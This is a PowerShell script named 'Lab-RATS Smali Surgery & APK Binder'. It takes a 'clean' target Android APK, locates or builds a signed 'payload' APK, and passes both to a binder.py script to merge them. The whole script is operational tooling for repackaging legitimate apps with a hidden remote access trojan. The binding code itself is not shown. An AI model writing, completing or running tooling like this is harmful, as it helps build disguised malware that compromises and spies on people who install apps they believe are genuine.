# Lab-RATS Smali Surgery & APK Binding Script (Windows PowerShell)
# Developed by K4N3CO © 2026

Param(
    [string]$TargetApk
)

$ErrorActionPreference = "Stop"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ProjectDir = Split-Path -Parent $ScriptDir

Write-Host " ┌───────────────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
Write-Host " │               Lab-RATS Smali Surgery & APK Binder                    │" -ForegroundColor Cyan
Write-Host " └───────────────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan

if (-not $TargetApk) {
    $TargetApk = Read-Host "    Enter path to target clean APK"
}

if (-not (Test-Path $TargetApk)) {
    Write-Host "[!] Target APK file not found: $TargetApk" -ForegroundColor Red
    exit 1
}

$PayloadApk = "$ScriptDir\output\signed_v1.apk"
if (-not (Test-Path $PayloadApk)) {
    $PayloadApk = "$ProjectDir\app\build\outputs\apk\release\app-release.apk"
}

if (-not (Test-Path $PayloadApk)) {
    Write-Host "[!] Payload APK (signed_v1.apk) not found. Building release payload now..." -ForegroundColor Yellow
    Set-Location $ProjectDir
    .\gradlew.bat assembleRelease --no-daemon
    if (Test-Path "$ProjectDir\app\build\outputs\apk\release\app-release.apk") {
        New-Item -ItemType Directory -Force -Path "$ScriptDir\output" | Out-Null
        Copy-Item "$ProjectDir\app\build\outputs\apk\release\app-release.apk" "$ScriptDir\output\signed_v1.apk"
        $PayloadApk = "$ScriptDir\output\signed_v1.apk"
    } else {
        Write-Host "[!] Payload APK compilation failed." -ForegroundColor Red
        exit 1
    }
    Set-Location $ScriptDir
}

python "$ScriptDir\binder.py" --target "$TargetApk" --payload "$PayloadApk"
